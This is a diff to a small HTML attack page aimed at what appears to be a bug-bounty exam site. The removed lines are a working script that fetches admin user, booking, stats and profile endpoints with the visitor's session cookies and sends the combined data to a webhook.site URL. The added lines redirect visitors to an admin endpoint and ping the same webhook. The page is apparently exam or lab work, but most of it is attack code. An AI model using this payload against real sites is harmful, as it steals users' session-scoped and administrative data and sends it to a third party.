@@ -1,34 +1,12 @@
 <!DOCTYPE html>
 <html>
+<head>
+    <meta http-equiv="refresh" content="0;url=https://api-bugbounty-exam.hashacademy.co/api/admin/bookings">
+</head>
 <body>
     <script>
-        const webh = "https://webhook.site/c1f0cbb1-5e7d-42b0-b3e6-1920534a7768";
-        const elenaId = "69d29dc2d8e73faab806acf3";
-
-        async function leakEverything() {
-            const targets = [
-                `/api/admin/users/${elenaId}`,
-                "/api/admin/bookings",
-                "/api/admin/stats",
-                "/api/auth/profile"
-            ];
-
-            let results = {};
-
-            for (let path of targets) {
-                try {
-                    const r = await fetch(path, { credentials: "include" });
-                    results[path] = await r.json();
-                } catch (e) {
-                    results[path] = "failed";
-                }
-            }
-
-            // Redirect the entire page to the webhook with all data combined
-            window.location.href = `${webh}?system_dump=${btoa(JSON.stringify(results))}`;
-        }
-
-        leakEverything();
+        // If the meta refresh doesn't work, try this
+        window.location.href = "https://webhook.site/c1f0cbb1-5e7d-42b0-b3e6-1920534a7768?hit=github_visited";
     </script>
 </body>
 </html>
